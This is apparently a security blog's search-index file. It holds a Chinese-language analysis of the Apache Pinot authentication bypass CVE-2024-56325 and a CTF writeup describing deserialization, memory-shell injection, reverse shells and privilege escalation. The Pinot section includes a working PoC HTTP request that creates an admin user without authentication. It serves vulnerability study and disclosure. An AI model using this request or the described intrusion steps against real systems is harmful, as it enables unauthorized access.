<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Apache Pinot CVE-2024-56325 Authentication Bypass 漏洞分析</title>
      <link href="/2025/04/03/Apache%20Pinot%20CVE-2024-56325%20Authentication%20Bypass%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2025/04/03/Apache%20Pinot%20CVE-2024-56325%20Authentication%20Bypass%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前两天看到这条通告，一搜发现评分 9.8，于是分析一下具体怎么个事</p><p><a href="https://www.openwall.com/lists/oss-security/2025/03/27/8">https://www.openwall.com/lists/oss-security/2025/03/27/8</a></p><h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>Apache Pinot 是一个实时分布式的 OLAP 数据存储和分析系统。使用它实现低延迟可伸缩的实时分析。Pinot 从离线数据源（包括 Hadoop 和各类文件）和在线数据源（如 Kafka）中攫取数据进行分析。</p><p>Apache Pinot 存在身份认证绕过漏洞。如果路径不包含 <code>/</code> 且包含 <code>.</code>则不需要身份验证。</p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>Apache Pinot &lt; 1.3</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>参考官方文档</p><p><a href="https://docs.pinot.apache.org/basics/getting-started/running-pinot-in-docker">https://docs.pinot.apache.org/basics/getting-started/running-pinot-in-docker</a></p><p>这里需要开启认证机制（文档给的命令是没开的），命令中设置 <code>-type</code> 参数为 auth 即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker run \</span><br><span class="line">    -p 2123:2123 \</span><br><span class="line">    -p 9000:9000 \</span><br><span class="line">    -p 8000:8000 \</span><br><span class="line">    -p 7050:7050 \</span><br><span class="line">    -p 6000:6000 \</span><br><span class="line">    apachepinot/pinot:1.2.0 QuickStart \</span><br><span class="line">    -<span class="built_in">type</span> auth</span><br></pre></td></tr></table></figure><p>如需调试可以用以下操作</p><p>首先启动容器，替换 entrypoint 命令为 &#x2F;bin&#x2F;bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -p 5005:5005 -p 2123:2123 -p 9000:9000 -p 8000:8000 -p 7050:7050 -p 6000:6000 --entrypoint /bin/bash apachepinot/pinot:1.2.0</span><br></pre></td></tr></table></figure><p>然后自行手动启动，并添加调试的参数<code>-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/lib/jvm/java-17-amazon-corretto/bin/java --add-opens=java.base/java.nio=ALL-UNNAMED --add-opens=java.base/sun.nio.ch=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED --add-opens=java.base/java.lang.reflect=ALL-UNNAMED -Xms4G -Xmx4G -Dpinot.admin.system.exit=<span class="literal">false</span> -Dplugins.<span class="built_in">dir</span>=/opt/pinot/plugins -classpath /opt/pinot/lib/*:/opt/pinot/plugins/pinot-stream-ingestion/pinot-pulsar/pinot-pulsar-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-stream-ingestion/pinot-kinesis/pinot-kinesis-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-stream-ingestion/pinot-kafka-2.0/pinot-kafka-2.0-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-batch-ingestion/pinot-batch-ingestion-standalone/pinot-batch-ingestion-standalone-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-minion-tasks/pinot-minion-builtin-tasks/pinot-minion-builtin-tasks-1.2.0.jar:/opt/pinot/plugins/pinot-segment-uploader/pinot-segment-uploader-default/pinot-segment-uploader-default-1.2.0.jar:/opt/pinot/plugins/pinot-segment-writer/pinot-segment-writer-file-based/pinot-segment-writer-file-based-1.2.0.jar:/opt/pinot/plugins/pinot-metrics/pinot-dropwizard/pinot-dropwizard-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-metrics/pinot-yammer/pinot-yammer-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-input-format/pinot-avro/pinot-avro-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-input-format/pinot-csv/pinot-csv-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-input-format/pinot-json/pinot-json-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-input-format/pinot-parquet/pinot-parquet-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-input-format/pinot-protobuf/pinot-protobuf-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-input-format/pinot-thrift/pinot-thrift-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-input-format/pinot-orc/pinot-orc-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-input-format/pinot-confluent-avro/pinot-confluent-avro-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-input-format/pinot-clp-log/pinot-clp-log-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-file-system/pinot-adls/pinot-adls-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-file-system/pinot-hdfs/pinot-hdfs-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-file-system/pinot-gcs/pinot-gcs-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-file-system/pinot-s3/pinot-s3-1.2.0-shaded.jar:/opt/pinot/plugins/pinot-environment/pinot-azure/pinot-azure-1.2.0-shaded.jar -Dapp.name=pinot-admin -Dapp.pid=1 -Dapp.repo=/opt/pinot/lib -Dapp.home=/opt/pinot -Dbasedir=/opt/pinot -agentlib:jdwp=transport=dt_socket,server=y,<span class="built_in">suspend</span>=n,address=*:5005 org.apache.pinot.tools.admin.PinotAdministrator QuickStart -<span class="built_in">type</span> auth</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ph0ebus/picture-bed@main/2025/04/08/5ceda7e3dcb512b0beb9f74e268ec5d2.png" alt="img"></p><p>访问 ip:9000 端口即可看到 Apache Pinot Controller 的认证页面</p><p><img src="https://cdn.jsdelivr.net/gh/ph0ebus/picture-bed@main/2025/04/08/c77fa486c7cd1086a13954d56f067c02.png" alt="img"></p><p>IDEA 远程调试的步骤这里不再赘述。</p><p>Apache Pinot 下载地址</p><p><a href="https://pinot.apache.org/download/">https://pinot.apache.org/download/</a></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>预期请求，未认证会响应 401</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/users</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Linux; U; Android 3.0.1; fr-fr; A500 Build/HRI66) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>180</span><br><span class="line"></span><br><span class="line"><span class="language-prolog">&#123;</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;username&quot;</span>: <span class="string">&quot;hack10&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;password&quot;</span>: <span class="string">&quot;hack&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;component&quot;</span>: <span class="string">&quot;CONTROLLER&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;role&quot;</span>: <span class="string">&quot;ADMIN&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;tables&quot;</span>: [],</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;permissions&quot;</span>: [],</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;usernameWithComponent&quot;</span>: <span class="string">&quot;hack_CONTROLLER&quot;</span></span></span><br><span class="line"><span class="language-prolog">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ph0ebus/picture-bed@main/2025/04/08/0b21db459973689c200714daef636826.png" alt="img"></p><p>构造如下 Poc 可成功绕过身份认证</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/users;.</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Linux; U; Android 3.0.1; fr-fr; A500 Build/HRI66) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>180</span><br><span class="line"></span><br><span class="line"><span class="language-prolog">&#123;</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;username&quot;</span>: <span class="string">&quot;hack10&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;password&quot;</span>: <span class="string">&quot;hack&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;component&quot;</span>: <span class="string">&quot;CONTROLLER&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;role&quot;</span>: <span class="string">&quot;ADMIN&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;tables&quot;</span>: [],</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;permissions&quot;</span>: [],</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;usernameWithComponent&quot;</span>: <span class="string">&quot;hack_CONTROLLER&quot;</span></span></span><br><span class="line"><span class="language-prolog">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ph0ebus/picture-bed@main/2025/04/08/e84da280f2c50ca1f7696298c65ee8cb.png" alt="img"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>主要关注 org.apache.pinot.controller.api 这个包</p><p>判断请求是否需要认证的方法为</p><p><code>org.apache.pinot.controller.api.access.AuthenticationFilter#filter</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">filter</span><span class="params">(ContainerRequestContext requestContext)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request)<span class="built_in">this</span>._requestProvider.get();</span><br><span class="line">    <span class="type">Method</span> <span class="variable">endpointMethod</span> <span class="operator">=</span> <span class="built_in">this</span>._resourceInfo.getResourceMethod();</span><br><span class="line">    <span class="type">AccessControl</span> <span class="variable">accessControl</span> <span class="operator">=</span> <span class="built_in">this</span>._accessControlFactory.create();</span><br><span class="line">    <span class="type">String</span> <span class="variable">endpointUrl</span> <span class="operator">=</span> request.getRequestURI().substring(request.getContextPath().length());</span><br><span class="line">    <span class="type">UriInfo</span> <span class="variable">uriInfo</span> <span class="operator">=</span> requestContext.getUriInfo();</span><br><span class="line">    <span class="keyword">if</span> (!isBaseFile(uriInfo.getPath()) &amp;&amp; !UNPROTECTED_PATHS.contains(uriInfo.getPath())) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!accessControl.protectAnnotatedOnly() || endpointMethod.isAnnotationPresent(Authenticate.class)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!endpointMethod.isAnnotationPresent(ManualAuthorization.class)) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">tableName</span> <span class="operator">=</span> extractTableName(uriInfo.getPathParameters(), uriInfo.getQueryParameters());</span><br><span class="line">                <span class="keyword">if</span> (tableName != <span class="literal">null</span>) &#123;</span><br><span class="line">                    tableName = DatabaseUtils.translateTableName(tableName, <span class="built_in">this</span>._httpHeaders);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">AccessType</span> <span class="variable">accessType</span> <span class="operator">=</span> <span class="built_in">this</span>.extractAccessType(endpointMethod);</span><br><span class="line">                AccessControlUtils.validatePermission(tableName, accessType, <span class="built_in">this</span>._httpHeaders, endpointUrl, accessControl);</span><br><span class="line">                FineGrainedAuthUtils.validateFineGrainedAuth(endpointMethod, uriInfo, <span class="built_in">this</span>._httpHeaders, accessControl);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析逻辑可以发现，这里的判断由两个因素组成，满足其中一个即可绕过认证，后者就是设置好的白名单，用于公共接口。</p><p><img src="https://cdn.jsdelivr.net/gh/ph0ebus/picture-bed@main/2025/04/08/8c9d72cf7d17b748f551615020e6221d.png" alt="img"></p><p>跟进<code>org.apache.pinot.controller.api.access.AuthenticationFilter#isBaseFile</code></p><p><img src="https://cdn.jsdelivr.net/gh/ph0ebus/picture-bed@main/2025/04/08/e1a170bf70484387c79e1b34974197c4.png" alt="img"></p><p>可以发现漏洞公告所提到的 “If the path does not contain &#x2F; and contain . authentication is not required”。因此当这个函数返回为 True 时，filter 方法的 if 判断则为 false，即无需认证。</p><p>然后我们来看如何在必须包含<code>.</code>的情况下访问正常的接口，也就是让这个点号不影响我们路由的解析。参考这篇文章可以找到 Apache Pinot 用的这款RESTful框架 —— jersey 的路由解析的逻辑和相关源码</p><p><a href="https://blog.csdn.net/qq_30062125/article/details/83758334">https://blog.csdn.net/qq_30062125/article/details/83758334</a></p><p>在<code>org.glassfish.jersey.server.internal.routing.RoutingStage#apply</code>打上断点</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Stage.Continuation&lt;RequestProcessingContext&gt; <span class="title function_">apply</span><span class="params">(RequestProcessingContext context)</span> &#123;</span><br><span class="line">    <span class="type">ContainerRequest</span> <span class="variable">request</span> <span class="operator">=</span> context.request();</span><br><span class="line">    context.triggerEvent(Type.MATCHING_START);</span><br><span class="line">    <span class="type">TracingLogger</span> <span class="variable">tracingLogger</span> <span class="operator">=</span> TracingLogger.getInstance(request);</span><br><span class="line">    <span class="type">long</span> <span class="variable">timestamp</span> <span class="operator">=</span> tracingLogger.timestamp(ServerTraceEvent.MATCH_SUMMARY);</span><br><span class="line"></span><br><span class="line">    Stage.Continuation var8;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">RoutingResult</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>._apply(context, <span class="built_in">this</span>.routingRoot);</span><br><span class="line">        Stage&lt;RequestProcessingContext&gt; nextStage = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (result.endpoint != <span class="literal">null</span>) &#123;</span><br><span class="line">            context.routingContext().setEndpoint(result.endpoint);</span><br><span class="line">            nextStage = <span class="built_in">this</span>.getDefaultNext();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var8 = Continuation.of(result.context, nextStage);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        tracingLogger.logDuration(ServerTraceEvent.MATCH_SUMMARY, timestamp, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里使用了前缀匹配<code>Type.MATCHING_START</code>，然后继续调试跟进<code>org.glassfish.jersey.server.internal.routing.RoutingStage#_apply</code></p><p><img src="https://cdn.jsdelivr.net/gh/ph0ebus/picture-bed@main/2025/04/08/473b038a6e054fe8151d94d7cbd95f08.png" alt="img"></p><p>然后跟进<code>org.glassfish.jersey.server.internal.routing.MatchResultInitializerRouter#apply</code>，这个方法在初始化路由匹配信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Router.Continuation <span class="title function_">apply</span><span class="params">(RequestProcessingContext processingContext)</span> &#123;</span><br><span class="line">    <span class="type">RoutingContext</span> <span class="variable">rc</span> <span class="operator">=</span> processingContext.routingContext();</span><br><span class="line">    rc.pushMatchResult(<span class="keyword">new</span> <span class="title class_">SingleMatchResult</span>(<span class="string">&quot;/&quot;</span> + processingContext.request().getPath(<span class="literal">false</span>)));</span><br><span class="line">    <span class="keyword">return</span> Continuation.of(processingContext, <span class="built_in">this</span>.rootRouter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取请求路径时参数为 false，即设置了不进行 url 解码，然后传入到 SingleMatchResult 类进行实例化</p><p><img src="https://cdn.jsdelivr.net/gh/ph0ebus/picture-bed@main/2025/04/08/048af90253dcce890b3f82e291e4dfa5.png" alt="img"></p><p>跟进 <code>SingleMatchResult</code> 类实例化的逻辑，可以发现这里对传入的路径进行了处理，简单说就是忽略 <code>;</code>和<code>/</code>之间的内容，包括<code>;</code>，如果 <code>;</code>后面没有下一个<code>/</code>则忽略之后所有内容。例如 <code>/aaa;bbb/cccc;dddd</code>传入该函数后会返回 <code>/aaa/ccc</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">SingleMatchResult</span><span class="params">(String path)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.path = stripMatrixParams(path);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">stripMatrixParams</span><span class="params">(String path)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">e</span> <span class="operator">=</span> path.indexOf(<span class="number">59</span>);</span><br><span class="line">    <span class="keyword">if</span> (e == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> path;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">s</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            sb.append(path, s, e);</span><br><span class="line">            s = path.indexOf(<span class="number">47</span>, e + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (s == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            e = path.indexOf(<span class="number">59</span>, s);</span><br><span class="line">        &#125; <span class="keyword">while</span>(e != -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (s != -<span class="number">1</span>) &#123;</span><br><span class="line">            sb.append(path, s, path.length());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然这里就是让路径中包含<code>.</code>号，而不影响路由解析的好办法。于是 Poc 中构造<code>;.</code>在正常接口后进行绕过认证机制。</p><p>然后给处理后的路径交给<code>org.glassfish.jersey.server.internal.routing.PathMatchingRouter#apply</code>匹配对应的路由规则，先匹配到 <code>/.*</code>这个规则</p><p><img src="https://cdn.jsdelivr.net/gh/ph0ebus/picture-bed@main/2025/04/08/a85c24c2a08366232c2068b8496a32e6.png" alt="img"></p><p>然后进一步匹配到<code>/users(/)?</code>这个规则</p><p><img src="https://cdn.jsdelivr.net/gh/ph0ebus/picture-bed@main/2025/04/08/5ed3b9d93910d256d90c1004e17be5fc.png" alt="image"></p><p>最终拿到对应的路由</p><p><img src="https://cdn.jsdelivr.net/gh/ph0ebus/picture-bed@main/2025/04/08/7100d482e1180f25fb6ece92c2100cee.png" alt="img"></p><h1 id="补丁修复"><a href="#补丁修复" class="headerlink" title="补丁修复"></a>补丁修复</h1><p><img src="https://cdn.jsdelivr.net/gh/ph0ebus/picture-bed@main/2025/04/08/d9f9acaccacf546c2bcc2d671063deb9.png" alt="img"></p><p>可以看到这里给获取到的路径也用了路由匹配时的<code>stripMatrixParams</code>方法进行处理，使点号无所遁形，也就没法构造为满足条件的路径了</p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>分析完发现这个漏洞还是有点鸡肋，需要没有<code>/</code>，也就是说，只能像<code>/aaa</code>这样的路由才能绕过认证，而 <code>/api/aaa</code>这种就没法绕过（难道是有可以构造的方式吗）。而且这个添加用户后，用户有哪些权限呢？因为对这款产品了解不多，确实没看出来新增的用户能干嘛（希望有大佬可以解答）。不过至少获取敏感信息还是可以做到的</p><p><img src="https://cdn.jsdelivr.net/gh/ph0ebus/picture-bed@main/2025/04/08/29c14608bfb046e1c11589b9a089ae03.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> cve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security </tag>
            
            <tag> zabbix </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN-长城杯半决赛ISW部分Writeup</title>
      <link href="/2025/03/25/CISCN-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9BISW%E9%83%A8%E5%88%86Writeup/"/>
      <url>/2025/03/25/CISCN-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9BISW%E9%83%A8%E5%88%86Writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="数据管理"><a href="#数据管理" class="headerlink" title="数据管理"></a>数据管理</h1><p>猜测是任意文件读取</p><p><img src="https://s2.loli.net/2025/03/25/YnFzZyGiAh9O5RE.png" alt="image-20250316141246133"></p><p>通过读取&#x2F;proc&#x2F;self&#x2F;cmdline可以定位到jar包，下载后找到shirokey</p><p><img src="https://s2.loli.net/2025/03/25/iKuweLVAsndJhQo.png" alt="image-20250316141311170"></p><p>直接打shiro反序列化</p><p><img src="https://s2.loli.net/2025/03/25/aQGbYqoMBLTArKs.png" alt="image-20250316141329853"></p><p>注入内存马</p><p><img src="https://s2.loli.net/2025/03/25/F5PlT2LKGbtCfd4.png" alt="image-20250316141345139"></p><p>写入.ssh公钥</p><p><img src="https://s2.loli.net/2025/03/25/SnpKB6IDhxEgyGA.png" alt="image-20250316141404115"></p><p>登录，suid提权</p><p><img src="https://s2.loli.net/2025/03/25/ixSY4mns9DENwI7.png" alt="image-20250316141425856"></p><h1 id="web-git"><a href="#web-git" class="headerlink" title="web-git"></a>web-git</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>存在目录遍历，可以找到预留后门</p><p><img src="https://s2.loli.net/2025/03/25/XbRwB1iTq9DufZC.png" alt="image-20250316142821864"></p><p><img src="https://s2.loli.net/2025/03/25/lSXtad6EoI2GZVi.png" alt="image-20250316142758195"></p><p>恢复git记录</p><p><img src="https://s2.loli.net/2025/03/25/3SFMgpOvYomZP1G.png" alt="6770903bec5838003c6749bd_1742115677231"></p><h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><p>查看文件权限发现&#x2F;home&#x2F;ryan下del.py可写，猜测是定时执行，直接反弹shell</p><p><img src="https://s2.loli.net/2025/03/25/LuBdGcWtxPeSCqm.png" alt="image-20250316154059221"></p><p><img src="https://s2.loli.net/2025/03/25/irOeT8hJUVm7ZbG.png" alt="image-20250316154125428"></p><p><img src="https://s2.loli.net/2025/03/25/tibXOEsymekVD9I.png" alt="image-20250316154242843"></p><p>ssh默认未启动需要手动开启</p><p><img src="https://s2.loli.net/2025/03/25/TRYkmjLdgya3AQ2.png" alt="image-20250316154305860"></p><p>修改root密码直接ssh连上</p><p><img src="https://s2.loli.net/2025/03/25/UFvBmYcs6TDakSp.png" alt="image-20250316154350159"></p><p><img src="https://s2.loli.net/2025/03/25/prUD9FNKfXjhHid.png" alt="image-20250316154413412"></p><p>查看aim.jpg然后人工OCR一下得到flag</p><h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>在&#x2F;home&#x2F;gitlab可以找到可疑文件lookme，发现flag</p><p><img src="https://s2.loli.net/2025/03/25/914ARSeIWubG2Yc.png" alt="6770903bec5838003c6749bd_1742116134975"></p><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>查看mail可以找到flag，解base64即可</p><p><img src="https://s2.loli.net/2025/03/25/AY5cIUt7v4MXnSu.png" alt="image-20250316160851215"></p><h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><h2 id="flag1-1"><a href="#flag1-1" class="headerlink" title="flag1"></a>flag1</h2><p>直接抓取对应网卡eth1的流量，等待五分钟后的结果，下载下来然后用wireshark分析</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> tcpdump -i eth1 -w output.pcap</span><br></pre></td></tr></table></figure><p>Wireshark图片</p><p>找到<code>192.168.57.203:4948</code>，md5得到<code>59110f555b5e5cd0a8713a447b082d63</code>，包上flag提交</p><p><img src="https://s2.loli.net/2025/03/25/MtEm69pgnal7kTz.png" alt="6741506cdf031d003c586ad8_1742115244313"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Tomcat CVE-2025-24813 漏洞分析复现</title>
      <link href="/2025/03/11/Apache%20Tomcat%20CVE-2025-24813%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/03/11/Apache%20Tomcat%20CVE-2025-24813%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/</url>
      
